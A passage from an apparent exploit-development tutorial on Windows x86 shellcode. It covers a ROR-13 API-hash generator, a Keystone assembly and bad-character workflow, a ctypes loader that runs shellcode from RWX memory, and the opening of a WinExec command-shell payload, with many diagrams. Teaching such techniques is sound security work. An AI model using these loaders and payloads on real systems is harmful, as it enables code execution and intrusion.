  <rect x="459" y="98" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="483" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
  <text x="540" y="112" fill="#00d4ff" font-size="10">AX = "ll"</text>
  <!-- Shift arrow -->
  <text x="180" y="160" fill="#ff6b35" font-size="11" font-weight="bold">SHL 8: all bytes slide left, low byte zeroed</text>
  <line x1="430" y1="130" x2="377" y2="148" stroke="#ff6b35" stroke-width="2" stroke-dasharray="4,3"/>
  <polygon points="380,144 374,152 384,150" fill="#ff6b35"/>
  <!-- Step 3 -->
  <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
  <rect x="300" y="178" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="178" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="377" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
  <rect x="406" y="178" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
  <rect x="459" y="178" width="48" height="28" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="483" y="197" text-anchor="middle" fill="#ff3366" font-size="12">00</text>
  <text x="540" y="192" fill="#ff6b35" font-size="10">= "ll\0" gap</text>
  <!-- Step 4 -->
  <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: mov al, 0x64</text>
  <rect x="300" y="228" width="48" height="28" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="324" y="247" text-anchor="middle" fill="#00ff88" font-size="11">\0</text>
  <rect x="353" y="228" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="377" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
  <rect x="406" y="228" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
  <rect x="459" y="228" width="48" height="28" rx="6" fill="#00ff88" stroke-width="2"/>
  <text x="483" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">64</text>
  <text x="540" y="237" fill="#00ff88" font-size="10" font-weight="bold">= "dll\0"</text>
  <text x="540" y="252" fill="#8b949e" font-size="9">0x006c6c64</text>
  <!-- Character labels underneath -->
  <text x="324" y="275" text-anchor="middle" fill="#8b949e" font-size="10">'\0'</text>
  <text x="377" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'l'</text>
  <text x="430" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'l'</text>
  <text x="483" y="275" text-anchor="middle" fill="#e0e7ff" font-size="10">'d'</text>
  <!-- Result box -->
  <rect x="140" y="295" width="470" height="30" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="315" text-anchor="middle" fill="#00ff88" font-size="12">push eax puts "dll\0" on the stack in little-endian order: 64 6c 6c 00</text>
</svg></div>

---

## 7. The ROR-13 Hash Generator

Our `find_function` engine identifies Windows API functions by comparing 32-bit hashes. Here is the Python utility that produces them.

### Python Implementation

```python
import sys

def ror13_hash(name):
    """Compute the ROR-13 hash of a function name."""
    h = 0
    for ch in name:
        h = ((h >> 13) | (h << (32 - 13))) & 0xFFFFFFFF
        h = (h + ord(ch)) & 0xFFFFFFFF
    return h

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python hash.py FunctionName [FunctionName ...]")
        sys.exit(1)

    for name in sys.argv[1:]:
        h = ror13_hash(name)
        print(f"  {name:30s} -> 0x{h:08x}")
```

Running it:

```
$ python hash.py LoadLibraryA CreateProcessA ExitProcess WSAStartup WSASocketA connect
  LoadLibraryA                   -> 0xec0e4e8e
  CreateProcessA                 -> 0x16b3fe72
  ExitProcess                    -> 0x73e2d87e
  WSAStartup                     -> 0x3bfcedcb
  WSASocketA                     -> 0xadf509d9
  connect                        -> 0x60aaf9ec
```

These are the exact values we embed as immediates in our shellcode.

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s107" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s107"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s107" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="310" rx="10" fill="url(#bg_s107)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s107)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s107)" font-weight="bold">ROR-13 Hash: Processing "L" (first char of LoadLibraryA)</text>
  <!-- Initial state -->
  <text x="40" y="58" fill="#ff6b35" font-size="12" font-weight="bold">Initial EDX:</text>
  <text x="170" y="58" fill="#e0e7ff" font-size="12">0x00000000</text>
  <!-- Bit representation before -->
  <text x="40" y="85" fill="#00d4ff" font-size="11" font-weight="bold">Before ROR 13:</text>
  <rect x="180" y="70" width="540" height="26" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="450" y="88" text-anchor="middle" fill="#e0e7ff" font-size="10">00000000 00000000 00000000 00000000</text>
  <!-- ROR operation -->
  <text x="375" y="115" text-anchor="middle" fill="#00ff88" font-size="12">ror edx, 13  (rotate right 13 bits -- no change when zero)</text>
  <!-- Add character -->
  <text x="40" y="145" fill="#00ff88" font-size="11" font-weight="bold">Add 'L' (0x4C):</text>
  <text x="200" y="145" fill="#e0e7ff" font-size="11">EDX = 0x00000000 + 0x4C = 0x0000004C</text>
  <!-- Result bits -->
  <rect x="180" y="155" width="540" height="26" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="450" y="173" text-anchor="middle" fill="#00ff88" font-size="10">00000000 00000000 00000000 01001100</text>
  <!-- Second iteration -->
  <rect x="30" y="195" width="690" height="95" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="215" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Next iteration: char 'o' (0x6F)</text>
  <text x="50" y="240" fill="#e0e7ff" font-size="11">ROR 13:  0x0000004C >> 13 | 0x0000004C &lt;&lt; 19 = 0x00260000</text>
  <text x="50" y="260" fill="#00ff88" font-size="11">Add 'o': 0x00260000 + 0x6F = 0x0026006F</text>
  <text x="50" y="280" fill="#8b949e" font-size="10">Each character rotates the accumulator right 13 bits, then adds the ASCII value</text>
</svg></div>

> **Important:** The hash algorithm in your shellcode and in your Python script must be identical. If you split the rotation for bad character avoidance (e.g., `ror edx, 7` + `ror edx, 6` instead of `ror edx, 13`), the total rotation is still 13, so the hashes remain the same.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s108" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s108"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s108" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s108)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s108)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s108)" font-weight="bold">ROR-13 Hash Pipeline: From API Name to Shellcode</text>
  <!-- Step 1: Function name -->
  <rect x="30" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="120" y="76" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">API Function Name</text>
  <text x="120" y="96" text-anchor="middle" fill="#e0e7ff" font-size="11">"LoadLibraryA"</text>
  <!-- Arrow 1 -->
  <line x1="215" y1="82" x2="253" y2="82" stroke="#00ff88" stroke-width="2"/>
  <polygon points="250,76 260,82 250,88" fill="#00ff88"/>
  <!-- Step 2: Hash script -->
  <rect x="265" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="355" y="76" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Python hash.py</text>
  <text x="355" y="96" text-anchor="middle" fill="#e0e7ff" font-size="11">ROR-13 each char</text>
  <!-- Arrow 2 -->
  <line x1="450" y1="82" x2="488" y2="82" stroke="#00ff88" stroke-width="2"/>
  <polygon points="485,76 495,82 485,88" fill="#00ff88"/>
  <!-- Step 3: Hash value -->
  <rect x="500" y="55" width="220" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="610" y="76" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">32-bit Hash</text>
  <text x="610" y="96" text-anchor="middle" fill="#00ff88" font-size="13">0xec0e4e8e</text>
  <!-- Arrow down -->
  <line x1="610" y1="115" x2="610" y2="145" stroke="#00ff88" stroke-width="2"/>
  <polygon points="604,142 610,152 616,142" fill="#00ff88"/>
  <!-- Step 4: Embedded in ASM -->
  <rect x="120" y="155" width="510" height="60" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="178" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Embedded in Shellcode Assembly</text>
  <text x="375" y="200" text-anchor="middle" fill="#e0e7ff" font-size="12">push 0xec0e4e8e    ; LoadLibraryA hash</text>
  <!-- Arrow down -->
  <line x1="375" y1="220" x2="375" y2="240" stroke="#00ff88" stroke-width="2"/>
  <polygon points="369,237 375,247 381,237" fill="#00ff88"/>
  <!-- Step 5: Resolution at runtime -->
  <rect x="200" y="248" width="350" height="25" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="266" text-anchor="middle" fill="#00d4ff" font-size="11">call find_function --> EAX = address of LoadLibraryA</text>
</svg></div>

---

## 8. Testing Shellcode: Keystone and ctypes

Before we write real payloads, we need a fast development loop. Three tools make this possible: **Keystone** (assembler), a **bad character scanner**, and **ctypes** (executor).

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s207" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s207"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s207" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="dev-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
    <marker id="dev-r" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff3366"/></marker>
    <linearGradient id="bg_s207" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s207"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s207" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s207)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s207)"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s207)" font-weight="bold">Shellcode Development Pipeline</text>
  <!-- Step 1: Write -->
  <rect x="30" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="90" y="85" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">1. Write</text>
  <text x="90" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">NASM Assembly</text>
  <line x1="150" y1="90" x2="185" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 2: Assemble -->
  <rect x="190" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="250" y="85" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">2. Assemble</text>
  <text x="250" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">Keystone</text>
  <line x1="310" y1="90" x2="345" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 3: Scan -->
  <rect x="350" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="410" y="85" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">3. Scan</text>
  <text x="410" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">Bad Chars?</text>
  <line x1="470" y1="90" x2="505" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 4: Execute -->
  <rect x="510" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="570" y="85" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">4. Execute</text>
  <text x="570" y="102" text-anchor="middle" fill="#e0e7ff" font-size="10">ctypes</text>
  <line x1="630" y1="90" x2="665" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <!-- Step 5: Debug -->
  <rect x="510" y="150" width="120" height="60" rx="8" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="570" y="175" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">5. Debug</text>
  <text x="570" y="192" text-anchor="middle" fill="#e0e7ff" font-size="10">WinDbg</text>
  <!-- Step 6: Fix -->
  <rect x="190" y="150" width="120" height="60" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="250" y="175" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">6. Fix</text>
  <text x="250" y="192" text-anchor="middle" fill="#e0e7ff" font-size="10">Adjust ASM</text>
  <!-- Arrows for the loop -->
  <line x1="570" y1="120" x2="570" y2="145" stroke="#00ff88" stroke-width="2" marker-end="url(#dev-a)"/>
  <line x1="510" y1="180" x2="315" y2="180" stroke="#ff3366" stroke-width="2" marker-end="url(#dev-r)"/>
  <path d="M 250,150 L 250,120" stroke="#ff3366" stroke-width="2" marker-end="url(#dev-r)"/>
  <!-- Annotations -->
  <rect x="90" y="240" width="570" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="260" text-anchor="middle" fill="#00ff88" font-size="12">Each iteration takes under a minute. Fix -> Reassemble -> Retest until clean.</text>
  <text x="375" y="276" text-anchor="middle" fill="#8b949e" font-size="10">Repeat steps 2-6 until no bad characters and the payload works correctly.</text>
</svg></div>

*Figure 8.1 - The shellcode development cycle: write, assemble, scan, execute, debug, fix, repeat.*

### Assembling with Keystone

Keystone converts our NASM assembly into raw machine code bytes.

```python
from keystone import Ks, KS_ARCH_X86, KS_MODE_32

CODE = """
start:
    mov   ebp, esp
    add   esp, 0xfffff9f0
    ; ... rest of shellcode ...
"""

ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
shellcode = bytes(encoding)
print(f"[+] Assembled {count} instructions, {len(shellcode)} bytes")
```

### Bad Character Scanner

After assembling, we scan the output for any byte that would break delivery.

```python
BAD_CHARS = set([0x00, 0x0a, 0x0d])

def check_bad_chars(shellcode, bad_chars):
    found = []
    for i, b in enumerate(shellcode):
        if b in bad_chars:
            found.append((i, b))
    if found:
        print("[!] Bad characters found:")
        for offset, byte in found:
            print(f"    Offset 0x{offset:04x}: 0x{byte:02x}")
    else:
        print("[+] No bad characters found!")
    return found
```

### Executing with ctypes

We allocate executable memory, copy our shellcode in, and jump to it.

```python
import ctypes

MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40
ptr = ctypes.windll.kernel32.VirtualAlloc(
    0, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE
)
ctypes.windll.msvcrt.memcpy(ptr, shellcode, len(shellcode))
shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(ctypes.c_void_p))
shellcode_func()
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s208" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s208"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s208" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="ct-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
    <linearGradient id="bg_s208" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s208"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s208" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s208)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s208)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s208)" font-weight="bold">ctypes Execution Flow</text>
  <rect x="30" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="110" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">VirtualAlloc</text>
  <text x="110" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">RWX memory page</text>
  <line x1="190" y1="82" x2="225" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="230" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="310" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">memcpy</text>
  <text x="310" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Copy shellcode bytes</text>
  <line x1="390" y1="82" x2="425" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="430" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="510" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">CFUNCTYPE cast</text>
  <text x="510" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Pointer to function</text>
  <line x1="590" y1="82" x2="625" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#ct-a)"/>
  <rect x="630" y="55" width="90" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="675" y="78" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Call!</text>
  <text x="675" y="95" text-anchor="middle" fill="#e0e7ff" font-size="10">Execute</text>
  <rect x="100" y="140" width="550" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="162" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">Memory Layout After Setup</text>
  <text x="375" y="182" text-anchor="middle" fill="#e0e7ff" font-size="11">[VirtualAlloc addr] -> [shellcode bytes copied here] -> EIP jumps here</text>
</svg></div>

*Figure 8.2 - The ctypes harness allocates RWX memory, copies shellcode in, then calls it as a function pointer.*

### Debugging with WinDbg

Insert `int3` at the start. Launch under WinDbg. Key commands: `t` (step), `r` (registers), `dd esp` (dump stack), `db esi` (display bytes), `u eip L20` (disassemble).

> **Development cycle:** Edit assembly, run Keystone, scan for bad chars, execute with ctypes, debug in WinDbg. Each iteration takes under a minute.

With our toolkit complete, we are ready to write real payloads.

---

## 9. Your First Shellcode: WinExec

Everything we have built so far the PEB walk, the export table parser, the ROR-13 hash resolver has been infrastructure. Now we put it all to work and write shellcode that actually *does* something: pop a command shell with `WinExec`.

### Step 1: Resolving kernel32.dll Functions

Our shellcode needs three functions from `kernel32.dll`. Each one is resolved by pushing its ROR-13 hash onto the stack, calling `find_function` (stored at `[ebp+0x04]`), and saving the returned address into our EBP variable table.

**TerminateProcess** `BOOL TerminateProcess(HANDLE hProcess, UINT uExitCode)` Terminates a process and all of its threads. We resolve it so we can cleanly exit after our payload runs. The hash `0x78b5b983` corresponds to the string `"TerminateProcess"` run through our ROR-13 algorithm.

**LoadLibraryA** `HMODULE LoadLibraryA(LPCSTR lpLibFileName)` Loads a DLL into the current process's address space and returns its base address. While we do not need it for this simple WinExec shellcode, we resolve it here because every future shellcode that uses networking (ws2_32.dll) will depend on it. Hash: `0xec0e4e8e`.

**WinExec** `UINT WinExec(LPCSTR lpCmdLine, UINT uCmdShow)` The simplest Windows API to execute a program. Hand it a pointer to a command string and a display flag, and Windows runs it. Hash: `0x0e8afe98`.

```nasm
resolve_symbols_kernel32:
    push  0x78b5b983            ; TerminateProcess hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x10], eax       ; save TerminateProcess address

    push  0xec0e4e8e            ; LoadLibraryA hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x14], eax       ; save LoadLibraryA address

    push  0x0e8afe98            ; WinExec hash
    call  dword ptr [ebp+0x04]  ; find_function
    mov   [ebp+0x18], eax       ; save WinExec address
```

Each `push + call + mov` triplet follows the same pattern: push the hash, call the resolver, store the result. After these nine instructions, our variable table is fully populated.

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s901" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s901"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s901" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="arr_s901" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s901)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s901)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s901)" font-weight="bold">WinExec Shellcode: API Resolution Map</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="11">Three kernel32.dll functions resolved via ROR-13 hash lookup</text>
  <rect x="30" y="65" width="280" height="220" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="170" y="87" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">EBP Variable Table</text>
  <rect x="45" y="97" width="250" height="28" rx="5" fill="#0d1117" stroke="#8b949e" stroke-width="1"/>
  <text x="170" y="115" text-anchor="middle" fill="#8b949e" font-size="11">[ebp+0x04] = find_function</text>
  <rect x="45" y="133" width="250" height="38" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="1.5"/>
  <text x="170" y="149" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[ebp+0x10] = TerminateProcess</text>
  <text x="170" y="164" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0x78b5b983</text>
  <rect x="45" y="179" width="250" height="38" rx="5" fill="#0d1117" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="170" y="195" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">[ebp+0x14] = LoadLibraryA</text>
  <text x="170" y="210" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0xec0e4e8e</text>
  <rect x="45" y="225" width="250" height="38" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="1.5"/>
  <text x="170" y="241" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">[ebp+0x18] = WinExec</text>
  <text x="170" y="256" text-anchor="middle" fill="#8b949e" font-size="9">hash: 0x0e8afe98</text>
  <rect x="400" y="97" width="310" height="50" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="555" y="115" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0x78b5b983</text>
  <text x="555" y="130" text-anchor="middle" fill="#ff3366" font-size="10">call [ebp+0x04] then mov [ebp+0x10], eax</text>
  <line x1="400" y1="122" x2="300" y2="152" stroke="#ff3366" stroke-width="1.5" marker-end="url(#arr_s901)"/>
  <rect x="400" y="155" width="310" height="50" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="555" y="173" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0xec0e4e8e</text>
  <text x="555" y="188" text-anchor="middle" fill="#ff6b35" font-size="10">call [ebp+0x04] then mov [ebp+0x14], eax</text>
  <line x1="400" y1="180" x2="300" y2="198" stroke="#ff6b35" stroke-width="1.5" marker-end="url(#arr_s901)"/>
  <rect x="400" y="213" width="310" height="50" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="555" y="231" text-anchor="middle" fill="#e0e7ff" font-size="11">push 0x0e8afe98</text>
  <text x="555" y="246" text-anchor="middle" fill="#00ff88" font-size="10">call [ebp+0x04] then mov [ebp+0x18], eax</text>
  <line x1="400" y1="238" x2="300" y2="244" stroke="#00ff88" stroke-width="1.5" marker-end="url(#arr_s901)"/>
  <text x="375" y="298" text-anchor="middle" fill="#8b949e" font-size="11">Each push+call+mov triplet: push hash, find_function resolves, store address in EBP table</text>
</svg></div>

*Figure 9.1 -- The three kernel32.dll APIs are resolved by pushing their ROR-13 hash, calling find_function, and storing each returned address at a known EBP offset.*

### Step 2: Understanding the WinExec API

`WinExec` is one of the oldest and simplest ways to run a program on Windows. Its signature from the Windows API:

```c
UINT WinExec(
    LPCSTR lpCmdLine,   // pointer to command string
    UINT   uCmdShow     // window display flag
);
```

It takes just two parameters pushed right-to-left (stdcall convention): `uCmdShow` first, then the pointer to the command string. We will use `SW_SHOW = 5` so the window is visible.

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s902" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s902"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s902" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="200" rx="10" fill="url(#bg_s902)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s902)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s902)" font-weight="bold">WinExec API -- stdcall Convention</text>
  <rect x="220" y="48" width="310" height="35" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
